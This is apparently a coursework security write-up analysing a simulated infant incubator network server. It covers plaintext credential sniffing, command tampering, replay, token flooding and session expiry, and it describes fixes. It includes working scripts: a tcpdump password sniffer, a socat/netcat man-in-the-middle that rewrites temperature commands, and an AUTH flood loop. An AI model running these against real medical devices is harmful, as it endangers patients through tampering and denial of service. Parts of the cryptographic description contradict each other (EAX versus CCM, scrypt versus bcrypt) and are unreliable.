# Infant Incubator Simulator: Vulnerabilities Description

## Attacks against Confidentiality

### Exposure of Logon Password and Token
The socket sendto call within the ``authenticate`` function: ``s.sendto(b"AUTH %s" % pw, ("127.0.0.1", p))`` submits the password alongside the AUTH command in plaintext. This risk has not been mitigated as no means of encryption can be found at the transport (eg. TLS) or network (eg. IPSec) layers. Using this information, we craft a test case in which traffic captured by tcpdump on ports 23456 and 23457 from the loopback interface is parsed using awk and packets containing the plaintext password are writtened to ``discovered.txt``. An attacker may simply intercept the credentials submitted as part of the authentication process, attempt logon themselves, and then issue (potentially dangerous) commands to the server using a valid token conferred to them.

Or, an attacker may sniff the token over the wire after authentication has taken place and use it to issue unauthorized commands against the unwitting user. In fact, the plaintext token may also be used to conduct a denial-of-service attack if it is sniffed and submitted alongside a LOGOUT request to the server each time.

As part of layered security approach, we would likely isolate the server in a network segment such that it is reachable only by the workstations in the neonatal intensive care unit and reinforced by NAC (eg. MAC address whitelisting).

```
sudo tcpdump -i lo -nnX dst port '(23456 or 23457)' | awk '{ if (/!Q#E%T&U8i6y4r2/ || /AUTH/ || /.*0x0030:.*/) { print > "discovered.txt" } else { print > "not-found.txt" } }' &
sleep 30

if grep -q "!Q#E%T&U8i6y4r2" discovered.txt; then
    echo plaintext password found
else
    echo plaintext password not found
fi
```

The encryption scheme we have implemented harnesses the scrypt PBKDF and AES 128-bit in EAX mode of operation to ensure perfect forward secrecy and reduce the risk of key compromise. Replay attacks can be mitigated by invalidating (ie. randomizing) either (1) the client-generated nonce value used for AES encryption or (2) salt value needed to recover the session key in the scrypt function--we elected to override the latter. If the session key is discarded, decryption fails due to incorrect key length or results in some plaintext value which fails the MAC verification check. 
## Attacks against Integrity

### Modification of Commands

A client may issue a command alongside the token conferred upon them to the server, but since the command is neither encrypted nor checked for truthfulness, it may be seamlessly interchanged by an attacker without detection. Therefore, an innocuous command like: 

``s.sendto(b"%s;GET_TEMP" % tok, ("127.0.0.1", p))``

may arrive to the server as:

``([A-Za-z0-9]{16});UPDATE_TEMP``

We devised the following scenario in which a socat server proxies the connection between the user and SampleNetworkServer, rewriting the "GET_TEMP" command to "UPDATE_TEMP," and vice versa:

```
sudo apt-get install socat
kill -9 $(sudo lsof -t -i:23456)
kill -9 $(sudo lsof -t -i:5557)
sleep 3 #allot time for termination of above processes 

python3 SampleNetworkServer.py & #start server in the background
sleep 1
socat -u tcp-l:5557,fork system:./modify.sh | nc -u 127.0.0.1 23456 & #start socat with script that rewrites commands; modified commands are piped to port 23456
sleep 1
token="$(echo "AUTH !Q#E%T&U8i6y4r2w" | nc -w 3 -u 127.0.0.1 23456)" #terminate netcat after three seconds
echo "the token: ${token}"
sleep 1
echo "issuing UPDATE_TEMP command to server..."
UPDATE_CMD="${token};UPDATE_TEMP"
echo "full command: ${UPDATE_CMD}"
echo "${UPDATE_CMD}" | nc -w 3 127.0.0.1 5557
```
**modify.sh**
```
#!/bin/bash
read MESSAGE
if grep -q "UPDATE" <<< "$MESSAGE"
then
	var=$(echo "$MESSAGE" | awk '{ sub(/UPDATE/,"GET"); print }')
	echo $var
elif grep -q "GET" <<< "$MESSAGE"
then
	var=$(echo "$MESSAGE" | awk '{ sub(/GET/,"UDPATE"); print }')
	echo $var
else
	echo $MESSAGE
fi
```

The success of the attack rests on commands being transmitted in plaintext and the absence of a mechanism to verify that the intended command was not modified in-transit.

### Replay Attack

Although encryption and hashing may prevent an attacker from learning meaningful information from packet traffic or passing modified content as genuine, they do not prevent the replay of captured UDP traffic. To mitigate this attack vector, we incorporate a nonce value within each AES-CCM operation that overwritten with an arbitrary value just before the encrypted response is sent into the socket. Why? if the nonce is not overwritten before the response is released into the socket **and** no successive requests are made to the server before an attacker initiates a replay attack, the possibility exists that the fraudulent message passes as legitimate, and an unsolicited, encrypted response will be generated for the user.

Furthermore, a bcrypt PBKDF function is harnessed to generate session keys for each query-response (ie. exchange) 

## "So you think you have signed out...": Lack of Identity

The current prototype uses a password and 16-character psuedorandom token with character set (^[A-Za-z0-9]{16}$) for its authentication processes. However, it does not have means for managing the identity of those successful logon attempts. This is less of an issue if we assume that only one nurse at a hospital should monitor the incubator and know the password. However, nurses carry a myriad of responsibilities and work in shifts, thus multiple nurses would access the remote interface. Should any of the nurses commit an act of malevolence, the organization has the ability to attribute/account for the damages.

Therefore, the authentication scheme has been amended to require users to supply a non-generic username along with their password in the form: ``AUTH USERNAME PASSWORD``. Passwords will be digested with the X algorithm, and stored/retrieved from a ``.env`` file stored on the server and secured with root privileges. 

## Duplicate Tokens

Although there is an infinitesimal chance of distributing a token which already exists in the list ``tokens[]`` given the sample space of (26 capital letters + 26 lowercase letters + 10 digits)^16, there is no mechanism to prevent that situation from occurring. Therefore, a check for whether a psuedorandomly generated token exists in ``tokens[]`` before appending it to the list should be implemented--if it does, generate a new one.

```
while True:
    gen_token = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
    if gen_token not in self.tokens:
        break
self.tokens.append(gen_token) 
```

**The problem**

Eve intercepts an ``AUTH`` communication by Alice to the ``SampleNetworkServer`` and discovers the command ``AUTH !Q#E%T&U8i6y4r2w`` in the application layer of the captured packets. We assume that the packets are unencrypted. Using this information, we craft a test case which generates and submits a fast and continuous stream of authentication requests to ``SampleNetworkServer``. Performed at scale, this attack could lead to token exhaustion (if unique tokens in ``tokens[]`` is enforced), duplicate tokens in ``tokens[]``, or eventually, a program crash due to system resource exhaustion. _If duplicate tokens exist, a user that performs a LOGOUT operation using their token has not invalidated their token until they have perform the LOGOUT operations for the number of token occurences_.

```
#!/usr/bin/bash

while :
do
	echo "AUTH !Q#E%T&U8i6y4r2w" | nc -u 127.0.0.1 23456 &
	printf "\n"
	sleep 1
	pid=$!
	( kill -TERM $pid ) 2>&1
done
```

## Excess Functionality: addInfant()

## Session Expiry

Unless the SampleNetworkServer is restarted, all previously issued access tokens are valid until the user explicitly invalidates them by issuing the LOGOUT command along with their access token(s). However, a nurse may forget or refuse to log out of the system at the conclusion of their shift. This results in a lack of forward secrecy as an attacker who has learned of a token from _X_ days/months/years ago may leverage it indefinitely.

One approach to mitigate this issue is to perform a server-side check of a token submitted alongside a command to ascertain that the difference between CURRENT_TIME and TIME is less than or equal to the MAX_AGE (defined by the system designer). If this statement evaluates to true, the token in question is removed from self.tokens[] and the user is prompted to re-authenticate.

We have implemented a token validity check in the form of a conditional statement:
```
if time.time() - self.tokens[gen_token] > 43200:
    nonce, encrypted_msg, tag = self.AES_encrypt(session_key, b"Expired Token\n")
    full_msg = nonce + b" " + encrypted_msg + b" " + tag
    self.serverSocket.sendto(full_msg, addr)   
```

and re-implemented _self.tokens_ as a dictionary instead a list structure, allowing us to append randomly generated tokens as keys and update their corresponding values with the time of generation. By storing this additional value, we are able to perform validity checks on whether the token in question has exceeded the max age of 12 hours.
